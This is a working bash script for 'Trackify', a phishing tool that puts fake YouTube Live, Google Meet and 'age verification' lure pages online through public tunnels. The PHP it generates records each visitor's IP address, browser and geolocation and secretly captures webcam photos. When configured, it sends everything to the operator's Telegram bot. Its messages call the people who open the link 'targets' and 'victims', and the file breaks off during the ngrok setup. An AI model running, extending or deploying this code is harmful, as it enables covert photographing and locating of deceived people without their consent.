#!/bin/bash
# Trackify v1.5
# Powered by TechChip
# Credits goes to thelinuxchoice [github.com/thelinuxchoice/]

trap 'printf "\n";stop' 2

banner() {
clear
printf "\e[1;92m ████████╗██████╗  █████╗  ██████╗██╗  ██╗██╗███████╗██╗   ██╗ \e[0m\n"
printf "\e[1;92m ╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██║██╔════╝╚██╗ ██╔╝ \e[0m\n"
printf "\e[1;92m    ██║   ██████╔╝███████║██║     █████╔╝ ██║█████╗   ╚████╔╝  \e[0m\n"
printf "\e[1;92m    ██║   ██╔══██╗██╔══██║██║     ██╔═██╗ ██║██╔══╝    ╚██╔╝   \e[0m\n"
printf "\e[1;92m    ██║   ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║        ██║    \e[0m\n"
printf "\e[1;92m    ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝        ╚═╝    \e[0m\n"
printf "\n"
printf "\e[1;91m                 ▄︻̷̿┻̿═━一  TRACKIFY  一━═┻̿︻̷▄                \e[0m\n"
printf " \e[1;93m Developed by: 0Cod3 \e[0m\n"
printf "\n"


printf "\n"


}

dependencies() {


command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
 


}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
checkcloudflared=$(ps aux | grep -o "cloudflared" | head -n1)

if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi

if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi

if [[ $checkcloudflared == *'cloudflared'* ]]; then
pkill -f -2 cloudflared > /dev/null 2>&1
killall -2 cloudflared > /dev/null 2>&1
fi

exit 1

}

catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

cat ip.txt >> saved.ip.txt


}

checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip
rm -rf ip.txt

fi

sleep 0.5

if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Victim's Photo Received!\e[0m\n"
rm -rf Log.log
fi
sleep 0.5

done 

}


server() {

command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }

printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi

$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &

sleep 8
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:3333)\e[0m\n"
fuser -k 3333/tcp > /dev/null 2>&1
php -S localhost:3333 > /dev/null 2>&1 &
sleep 3

# Wait for sendlink file to have content (with timeout)
printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Waiting for Serveo link...\e[0m\n"
max_wait=30
wait_count=0
while [ $wait_count -lt $max_wait ]; do
    if [[ -s "sendlink" ]]; then
        # Check if file contains a URL
        if grep -qE "https://" sendlink 2>/dev/null; then
            break
        fi
    fi
    sleep 1
    wait_count=$((wait_count + 1))
done

# Strip ANSI codes first, then extract URL - this handles the escape sequences
send_link=$(cat sendlink 2>/dev/null | sed 's/\x1b\[[0-9;]*m//g' | grep -oE "https://[^[:space:]]+" | head -n1)
# If that fails, try with a more specific pattern
if [[ -z "$send_link" ]]; then
    send_link=$(cat sendlink 2>/dev/null | tr -d '\r' | sed 's/\x1b\[[0-9;]*m//g' | grep -oE "https://[a-zA-Z0-9\-\.]+\.(serveo\.net|serveousercontent\.com)" | head -n1)
fi
# Last resort: extract anything after https://
if [[ -z "$send_link" ]]; then
    send_link=$(cat sendlink 2>/dev/null | sed 's/.*https:\/\///' | sed 's/[[:space:]].*//' | head -n1)
    if [[ -n "$send_link" && "$send_link" != *"https://"* ]]; then
        send_link="https://$send_link"
    fi
fi
# Display the link
if [[ -n "$send_link" ]]; then
    printf '\n\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Tracker Link:\e[0m\e[1;77m %s\e[0m\n\n' "$send_link"
else
    printf '\n\e[1;31m[!] Could not extract link from sendlink file\e[0m\n'
    printf '\e[1;77m[DEBUG] sendlink file exists: %s\e[0m\n' "$([ -e sendlink ] && echo 'yes' || echo 'no')"
    printf '\e[1;77m[DEBUG] sendlink file size: %s bytes\e[0m\n' "$([ -e sendlink ] && wc -c < sendlink || echo '0')"
    printf '\e[1;77m[DEBUG] sendlink contents:\e[0m\n'
    cat sendlink 2>/dev/null || echo "Cannot read sendlink file"
    printf '\e[1;77m[DEBUG] Cleaned contents (without ANSI codes):\e[0m\n'
    cat sendlink 2>/dev/null | sed 's/\x1b\[[0-9;]*m//g' || echo "Cannot process sendlink file"
    printf '\n'
fi

}


payload_ngrok() {

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
if [[ -z "$link" ]]; then
    printf "\e[1;31m[!] Error: Could not extract Ngrok link\e[0m\n"
    return 1
fi
generate_payload "$link"

}

cloudflared_server() {

command -v cloudflared > /dev/null 2>&1
if [[ $? -ne 0 ]]; then
    printf "\e[1;92m[\e[0m+\e[1;92m] Cloudflared not found. Downloading...\n"
    arch=$(uname -m)
    os=$(uname -s | tr '[:upper:]' '[:lower:]')
    
    if [[ "$os" == "linux" ]]; then
        if [[ "$arch" == *"arm"* ]] || [[ "$arch" == *"aarch64"* ]]; then
            wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared 2>/dev/null || \
            wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared 2>/dev/null
        elif [[ "$arch" == *"x86_64"* ]] || [[ "$arch" == *"amd64"* ]]; then
            wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared 2>/dev/null
        else
            wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared 2>/dev/null
        fi
    elif [[ "$os" == "darwin" ]]; then
        if [[ "$arch" == *"arm"* ]] || [[ "$arch" == *"aarch64"* ]]; then
            wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-arm64 -O cloudflared 2>/dev/null
        else
            wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64 -O cloudflared 2>/dev/null
        fi
    else
        printf "\e[1;93m[!] Unsupported OS. Please install cloudflared manually.\e[0m\n"
        printf "\e[1;93m[!] Visit: https://github.com/cloudflare/cloudflared/releases\e[0m\n"
        exit 1
    fi
    
    if [[ -e cloudflared ]]; then
        chmod +x cloudflared
        printf "\e[1;92m[\e[0m*\e[1;92m] Cloudflared downloaded successfully\e[0m\n"
    else
        printf "\e[1;93m[!] Download failed. Please install cloudflared manually.\e[0m\n"
        exit 1
    fi
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi

printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting php server... (localhost:3333)\e[0m\n"
fuser -k 3333/tcp > /dev/null 2>&1
php -S localhost:3333 > /dev/null 2>&1 &
sleep 2

printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Cloudflare tunnel...\e[0m\n"
if [[ -e cloudflared ]]; then
    ./cloudflared tunnel --url http://localhost:3333 > sendlink 2>&1 &
else
    cloudflared tunnel --url http://localhost:3333 > sendlink 2>&1 &
fi

sleep 8

# Wait for sendlink file to have content (with timeout)
printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Waiting for Cloudflare tunnel link...\e[0m\n"
max_wait=30
wait_count=0
while [ $wait_count -lt $max_wait ]; do
    if [[ -s "sendlink" ]]; then
        # Check if file contains a URL
        if grep -qE "https://.*trycloudflare.com" sendlink 2>/dev/null; then
            break
        fi
    fi
    sleep 1
    wait_count=$((wait_count + 1))
done

# Extract Cloudflare tunnel URL
send_link=$(cat sendlink 2>/dev/null | grep -oE "https://[a-zA-Z0-9\-]+\.trycloudflare\.com" | head -n1)

if [[ -n "$send_link" ]]; then
    printf '\n\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Tracker Link:\e[0m\e[1;77m %s\e[0m\n\n' "$send_link"
    # Generate payload with the extracted link
    generate_payload "$send_link"
else
    printf '\n\e[1;31m[!] Could not extract Cloudflare tunnel link\e[0m\n'
    printf '\e[1;77m[DEBUG] sendlink file exists: %s\e[0m\n' "$([ -e sendlink ] && echo 'yes' || echo 'no')"
    printf '\e[1;77m[DEBUG] sendlink contents:\e[0m\n'
    cat sendlink 2>/dev/null | head -20 || echo "Cannot read sendlink file"
    printf '\n'
    return 1
fi

}

generate_payload() {
local link="$1"
if [[ -z "$link" ]]; then
    printf '\e[1;31m[!] Error: No link provided for payload generation\e[0m\n'
    return 1
fi

# Generate index.php with forwarding link
sed 's+forwarding_link+'$link'+g' template.php > index.php

# Backup original PHP files if backup doesn't exist
if [[ ! -f "ip.php.backup" ]] && [[ -f "ip.php" ]]; then
    cp ip.php ip.php.backup 2>/dev/null || true
fi
if [[ ! -f "post.php.backup" ]] && [[ -f "post.php" ]]; then
    cp post.php post.php.backup 2>/dev/null || true
fi

# Always restore from backup first (if exists) to ensure clean state
if [[ -f "ip.php.backup" ]]; then
    cp ip.php.backup ip.php 2>/dev/null || true
fi
if [[ -f "post.php.backup" ]]; then
    cp post.php.backup post.php 2>/dev/null || true
fi

# Generate ip.php with Telegram configuration if enabled
if [[ "$telegram_enabled" == "1" ]]; then
    # Create ip.php with Telegram support (reads from config file)
    cat > ip.php << 'IPEOF'
<?php

// Include geolocation helper
if (file_exists('geo.php')) {
    require_once 'geo.php';
}

if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
    }
else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
    }
$useragent = " User-Agent: ";
$browser = $_SERVER['HTTP_USER_AGENT'];

// Get IP geolocation if geo.php is available
$ip_clean = trim($ipaddress);
$geo = null;
if (function_exists('getIPLocation')) {
    $geo = getIPLocation($ip_clean);
    if ($geo && function_exists('saveGeoData')) {
        saveGeoData($ip_clean, $geo);
    }
}

$file = 'ip.txt';
$victim = "IP: ";
$fp = fopen($file, 'a');

fwrite($fp, $victim);
fwrite($fp, $ipaddress);
fwrite($fp, $useragent);
fwrite($fp, $browser);

// Add geolocation info to file if available
if ($geo && function_exists('formatGeoLocation') && isset($geo['status']) && $geo['status'] === 'success') {
    fwrite($fp, "\n" . formatGeoLocation($geo) . "\n");
}

fclose($fp);

// Send to Telegram - load from config file
$telegram_token = '';
$telegram_chat = '';
$config_file = 'telegram_config.json';

if (file_exists($config_file)) {
    $config_content = file_get_contents($config_file);
    $config = json_decode($config_content, true);
    if ($config && isset($config['bot_token']) && isset($config['chat_id'])) {
        $telegram_token = $config['bot_token'];
        $telegram_chat = $config['chat_id'];
    }
}

// Only send if Telegram is configured
if (!empty($telegram_token) && !empty($telegram_chat)) {
    // Escape special characters in message
    $browser_clean = htmlspecialchars($browser, ENT_QUOTES, 'UTF-8');
    $message = "🔔 *New Target Opened Link*\n\n";
    $message .= "📍 *IP Address:* " . $ip_clean . "\n";
    $message .= "🌐 *User Agent:* " . $browser_clean . "\n";
    $message .= "⏰ *Time:* " . date('Y-m-d H:i:s') . "\n";

    // Add geolocation to Telegram message if available
    if ($geo && function_exists('formatGeoForTelegram') && isset($geo['status']) && $geo['status'] === 'success') {
        $message .= "\n" . formatGeoForTelegram($geo);
    }

    $url = "https://api.telegram.org/bot" . $telegram_token . "/sendMessage";
    $data = array(
        'chat_id' => $telegram_chat,
        'text' => $message,
        'parse_mode' => 'Markdown'
    );

    $options = array(
        'http' => array(
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data),
            'timeout' => 10,
            'ignore_errors' => true
        )
    );

    $context = stream_context_create($options);
    $result = @file_get_contents($url, false, $context);

    // Log errors if any
    if ($result === false) {
        $error = error_get_last();
        if ($error !== null) {
            error_log("Telegram send error: " . $error['message'], 3, "telegram_error.log");
        }
    }
}
IPEOF
fi

# Generate post.php with Telegram configuration if enabled
if [[ "$telegram_enabled" == "1" ]]; then
    cat > post.php << 'POSTEOF'
<?php

$date = date('dMYHis');
$imageData=$_POST['cat'];

if (!empty($_POST['cat'])) {
error_log("Received" . "\r\n", 3, "Log.log");
}

// Create folder name with current date only
$folderName = date('Y-m-d');

// Create folder if it doesn't exist
if (!file_exists($folderName)) {
    mkdir($folderName, 0777, true);
}

$filteredData=substr($imageData, strpos($imageData, ",")+1);
$unencodedData=base64_decode($filteredData);
$filePath = $folderName . '/cam' . $date . '.png';
$fp = fopen($filePath, 'wb');
fwrite($fp, $unencodedData);
fclose($fp);

// Send to Telegram - load from config file
$telegram_token = '';
$telegram_chat = '';
$config_file = 'telegram_config.json';

if (file_exists($config_file)) {
    $config_content = file_get_contents($config_file);
    $config = json_decode($config_content, true);
    if ($config && isset($config['bot_token']) && isset($config['chat_id'])) {
        $telegram_token = $config['bot_token'];
        $telegram_chat = $config['chat_id'];
    }
}

// Only send if Telegram is configured
if (!empty($telegram_token) && !empty($telegram_chat)) {
    // Send photo to Telegram using cURL if available, otherwise use file_get_contents
    $url = "https://api.telegram.org/bot" . $telegram_token . "/sendPhoto";
    $caption = "📸 *Camera Capture*\n\n⏰ *Time:* " . date('Y-m-d H:i:s');

    if (function_exists('curl_file_create')) {
        // Use cURL (preferred method)
        $cfile = curl_file_create($filePath, 'image/png', 'cam' . $date . '.png');
        $data = array(
            'chat_id' => $telegram_chat,
            'photo' => $cfile,
            'caption' => $caption,
            'parse_mode' => 'Markdown'
        );
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        $result = curl_exec($ch);
        $error = curl_error($ch);
        curl_close($ch);
        
        if ($error) {
            error_log("Telegram cURL error: " . $error, 3, "telegram_error.log");
        }
    } else {
        // Fallback to file_get_contents with multipart
        $boundary = uniqid();
        $delimiter = '-------------' . $boundary;
        
        $postData = '';
        $postData .= "--" . $delimiter . "\r\n";
        $postData .= 'Content-Disposition: form-data; name="chat_id"' . "\r\n\r\n";
        $postData .= $telegram_chat . "\r\n";
        
        $postData .= "--" . $delimiter . "\r\n";
        $postData .= 'Content-Disposition: form-data; name="photo"; filename="cam' . $date . '.png"' . "\r\n";
        $postData .= 'Content-Type: image/png' . "\r\n\r\n";
        $postData .= $unencodedData . "\r\n";
        
        $postData .= "--" . $delimiter . "\r\n";
        $postData .= 'Content-Disposition: form-data; name="caption"' . "\r\n\r\n";
        $postData .= $caption . "\r\n";
        $postData .= "--" . $delimiter . "--\r\n";
        
        $options = array(
            'http' => array(
                'method' => 'POST',
                'header' => 'Content-Type: multipart/form-data; boundary=' . $delimiter,
                'content' => $postData,
                'timeout' => 10,
                'ignore_errors' => true
            )
        );
        
        $context = stream_context_create($options);
        $result = @file_get_contents($url, false, $context);
        
        if ($result === false) {
            $error = error_get_last();
            if ($error !== null) {
                error_log("Telegram send error: " . $error['message'], 3, "telegram_error.log");
            }
        }
    }
}

exit();
?>
POSTEOF
fi

if [[ $option_tem -eq 1 ]]; then
sed 's+forwarding_link+'$link'+g' Youtube.html > index3.html
sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
rm -rf index3.html
elif [[ $option_tem -eq 2 ]]; then
sed 's+forwarding_link+'$link'+g' Gmeet.html > index2.html
elif [[ $option_tem -eq 3 ]]; then
sed 's+forwarding_link+'$link'+g' Sensitive.html > index2.html
fi
}

read_telegram_config() {
local config_file="telegram_config.json"
telegram_token=""
telegram_chat=""

if [[ ! -f "$config_file" ]]; then
    return 1
fi

# Use PHP to parse JSON (most reliable since PHP is a dependency)
if command -v php > /dev/null 2>&1; then
    telegram_token=$(php -r "\$config = json_decode(file_get_contents('$config_file'), true); echo isset(\$config['bot_token']) ? \$config['bot_token'] : '';" 2>/dev/null | tr -d '\r\n')
    telegram_chat=$(php -r "\$config = json_decode(file_get_contents('$config_file'), true); echo isset(\$config['chat_id']) ? \$config['chat_id'] : '';" 2>/dev/null | tr -d '\r\n')
# Try Python as fallback
elif command -v python3 > /dev/null 2>&1; then
    telegram_token=$(python3 -c "import json; f=open('$config_file', 'r', encoding='utf-8'); d=json.load(f); f.close(); print(d.get('bot_token', '') or '')" 2>/dev/null | tr -d '\r\n')
    telegram_chat=$(python3 -c "import json; f=open('$config_file', 'r', encoding='utf-8'); d=json.load(f); f.close(); print(d.get('chat_id', '') or '')" 2>/dev/null | tr -d '\r\n')
elif command -v python > /dev/null 2>&1; then
    telegram_token=$(python -c "import json; f=open('$config_file', 'r'); d=json.load(f); f.close(); print(d.get('bot_token', '') or '')" 2>/dev/null | tr -d '\r\n')
    telegram_chat=$(python -c "import json; f=open('$config_file', 'r'); d=json.load(f); f.close(); print(d.get('chat_id', '') or '')" 2>/dev/null | tr -d '\r\n')
elif command -v jq > /dev/null 2>&1; then
    telegram_token=$(jq -r '.bot_token // empty' "$config_file" 2>/dev/null | tr -d '\r\n')
    telegram_chat=$(jq -r '.chat_id // empty' "$config_file" 2>/dev/null | tr -d '\r\n')
fi

# If still empty, use simple text parsing (works everywhere including Windows Git Bash)
if [[ -z "$telegram_token" ]] || [[ -z "$telegram_chat" ]]; then
    # Read entire file content
    local file_content=$(cat "$config_file" 2>/dev/null | tr -d '\r')
    
    # Extract bot_token - look for pattern: "bot_token": "value"
    if echo "$file_content" | grep -q '"bot_token"'; then
        # Try multiple extraction methods
        telegram_token=$(echo "$file_content" | grep -o '"bot_token"[^}]*' | grep -o '"[^"]*"' | head -2 | tail -1 | tr -d '"')
        # If that didn't work, try sed
        if [[ -z "$telegram_token" ]]; then
            telegram_token=$(echo "$file_content" | sed -n 's/.*"bot_token"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p')
        fi
    fi
    
    # Extract chat_id - look for pattern: "chat_id": "value"
    if echo "$file_content" | grep -q '"chat_id"'; then
        # Try multiple extraction methods
        telegram_chat=$(echo "$file_content" | grep -o '"chat_id"[^}]*' | grep -o '"[^"]*"' | head -2 | tail -1 | tr -d '"')
        # If that didn't work, try sed
        if [[ -z "$telegram_chat" ]]; then
            telegram_chat=$(echo "$file_content" | sed -n 's/.*"chat_id"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p')
        fi
    fi
fi

# Trim whitespace (handle both spaces and tabs)
telegram_token=$(echo "$telegram_token" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
telegram_chat=$(echo "$telegram_chat" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')

# Check if values are valid (not empty and not just whitespace)
if [[ -n "$telegram_token" && "$telegram_token" != "null" && -n "$telegram_chat" && "$telegram_chat" != "null" ]]; then
    return 0
fi

return 1
}

save_telegram_config() {
local config_file="telegram_config.json"
local token="$1"
local chat="$2"

# Try to save using available tools
if command -v python3 > /dev/null 2>&1; then
    python3 -c "import json; f=open('$config_file', 'w'); json.dump({'bot_token': '$token', 'chat_id': '$chat'}, f, indent=2); f.close()" 2>/dev/null
elif command -v python > /dev/null 2>&1; then
    python -c "import json; f=open('$config_file', 'w'); json.dump({'bot_token': '$token', 'chat_id': '$chat'}, f, indent=2); f.close()" 2>/dev/null
elif command -v jq > /dev/null 2>&1; then
    echo "{\"bot_token\": \"$token\", \"chat_id\": \"$chat\"}" | jq '.' > "$config_file" 2>/dev/null
else
    # Fallback: simple JSON writing
    cat > "$config_file" << EOF
{
  "bot_token": "$token",
  "chat_id": "$chat"
}
EOF
fi

if [[ -f "$config_file" ]]; then
    printf "\e[1;92m[\e[0m+\e[1;92m] Telegram configuration saved to %s\e[0m\n" "$config_file"
    return 0
else
    printf "\e[1;93m[!] Warning: Could not save configuration file\e[0m\n"
    return 1
fi
}

normalize_telegram_chat() {
local chat="$1"
# If it's already a chat ID (numeric, can be negative), use as is
if [[ "$chat" =~ ^-?[0-9]+$ ]]; then
    echo "$chat"
# If it starts with @, use as is
elif [[ "$chat" =~ ^@ ]]; then
    echo "$chat"
# Otherwise, add @ prefix for username
else
    echo "@$chat"
fi
}

test_telegram_bot() {
local test_message="✅ Trackify Telegram bot is configured correctly!\n\nThis is a test message."
local url="https://api.telegram.org/bot${telegram_token}/sendMessage"
local data="chat_id=${telegram_chat}&text=${test_message}&parse_mode=Markdown"

if command -v curl > /dev/null 2>&1; then
    response=$(curl -s -X POST "$url" -d "$data" 2>&1)
elif command -v wget > /dev/null 2>&1; then
    response=$(wget -qO- --post-data="$data" "$url" 2>&1)
else
    printf "\e[1;93m[!] curl or wget not found. Cannot test Telegram connection.\e[0m\n"
    printf "\e[1;93m[!] Please make sure your bot token and chat ID are correct.\e[0m\n"
    return 1
fi

if echo "$response" | grep -q '"ok":true'; then
    printf "\e[1;92m[\e[0m+\e[1;92m] Telegram bot test successful! Check your Telegram for the test message.\e[0m\n"
    return 0
else
    printf "\e[1;91m[!] Telegram bot test failed!\e[0m\n"
    printf "\e[1;93m[!] Response: %s\e[0m\n" "$response"
    printf "\e[1;93m[!] Common issues:\e[0m\n"
    printf "\e[1;93m    - Invalid bot token\e[0m\n"
    printf "\e[1;93m    - Bot hasn't been started (send /start to your bot first)\e[0m\n"
    printf "\e[1;93m    - Invalid username/chat ID\e[0m\n"
    printf "\e[1;93m    - Username must start with @ or be a numeric chat ID\e[0m\n"
    read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Continue anyway? [y/N]: \e[0m' continue_anyway
    if [[ ! "$continue_anyway" =~ ^[Yy]$ ]]; then
        select_notification
    fi
    return 1
fi
}

select_notification() {
printf "\n-----Choose notification method----\n"
printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Default (Local file)\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Telegram Bot\e[0m\n"
default_option_notification="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose notification method: [Default is 1] \e[0m' option_notification
option_notification="${option_notification:-${default_option_notification}}"
if [[ $option_notification -eq 1 ]]; then
printf "\e[1;93m[\e[0m*\e[1;93m] Selected: Default (Local file)\e[0m\n"
telegram_enabled="0"
elif [[ $option_notification -eq 2 ]]; then
printf "\e[1;93m[\e[0m*\e[1;93m] Selected: Telegram Bot\e[0m\n"
telegram_enabled="1"

# Try to load from config file first
if read_telegram_config; then
    printf "\e[1;92m[\e[0m+\e[1;92m] Loaded Telegram configuration from telegram_config.json\e[0m\n"
    printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Bot Token: %s...\e[0m\n" "${telegram_token:0:20}"
    printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Chat ID: %s\e[0m\n" "$telegram_chat"
    printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Testing Telegram bot connection...\e[0m\n"
    test_telegram_bot
else
    # Config file doesn't exist or is invalid, prompt for details
    printf "\e[1;93m[\e[0m*\e[1;93m] No valid Telegram configuration found in telegram_config.json\e[0m\n"
    printf "\e[1;93m[\e[0m*\e[1;93m] Note: Get your bot token from @BotFather on Telegram\e[0m\n"
    read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter Telegram Bot Token: \e[0m' telegram_token
    printf "\e[1;93m[\e[0m*\e[1;93m] Note: Enter YOUR username (where bot will send data), NOT the bot username\e[0m\n"
    read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YOUR Telegram Username (e.g., yourusername) or Chat ID: \e[0m' telegram_chat_input
    if [[ -z "$telegram_token" ]] || [[ -z "$telegram_chat_input" ]]; then
        printf "\e[1;93m [!] Telegram token and username/chat_id are required!\e[0m\n"
        sleep 1
        select_notification
    else
        telegram_chat=$(normalize_telegram_chat "$telegram_chat_input")
        printf "\e[1;92m[\e[0m*\e[1;92m] Using chat identifier: %s\e[0m\n" "$telegram_chat"
        printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Testing Telegram bot connection...\e[0m\n"
        test_telegram_bot
        
        # Save configuration after successful test
        if [[ $? -eq 0 ]]; then
            save_telegram_config "$telegram_token" "$telegram_chat"
        fi
    fi
fi
else
printf "\e[1;93m [!] Invalid notification option! try again\e[0m\n"
sleep 1
select_notification
fi
}

select_template() {
printf "\n-----Choose a template----\n"    
printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m YouTube Live\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Google Meet\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Sensitive Video (Age Verification)\e[0m\n"
default_option_template="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template: [Default is 1] \e[0m' option_tem
option_tem="${option_tem:-${default_option_template}}"
if [[ $option_tem -eq 1 ]]; then
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YouTube video watch ID: \e[0m' yt_video_ID
elif [[ $option_tem -eq 2 ]]; then
printf ""
elif [[ $option_tem -eq 3 ]]; then
printf ""
else
printf "\e[1;93m [!] Invalid template option! try again\e[0m\n"
sleep 1
select_template
fi
}

select_tunnel() {
printf "\n-----Choose a tunnel service----\n"
printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Cloudflare Tunnel (cloudflared)\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
default_option_tunnel="3"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a tunnel service: [Default is 3] \e[0m' option_tunnel
option_tunnel="${option_tunnel:-${default_option_tunnel}}"
if [[ $option_tunnel -eq 1 ]]; then
printf "\e[1;93m[\e[0m*\e[1;93m] Selected: Ngrok\e[0m\n"
elif [[ $option_tunnel -eq 2 ]]; then
printf "\e[1;93m[\e[0m*\e[1;93m] Selected: Cloudflare Tunnel\e[0m\n"
elif [[ $option_tunnel -eq 3 ]]; then
printf "\e[1;93m[\e[0m*\e[1;93m] Selected: Serveo.net\e[0m\n"
else
printf "\e[1;93m [!] Invalid tunnel option! try again\e[0m\n"
sleep 1
select_tunnel
fi
}

ngrok_server() {


if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi

else
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi
if [[ -e ~/.ngrok2/ngrok.yml ]]; then
printf "\e[1;93m[\e[0m*\e[1;93m] your ngrok "
cat  ~/.ngrok2/ngrok.yml
read -p $'\n\e[1;92m[\e[0m+\e[0m\e[1;92m] Do you want to change your ngrok authtoken? [Y/n]:\e[0m ' chg_token
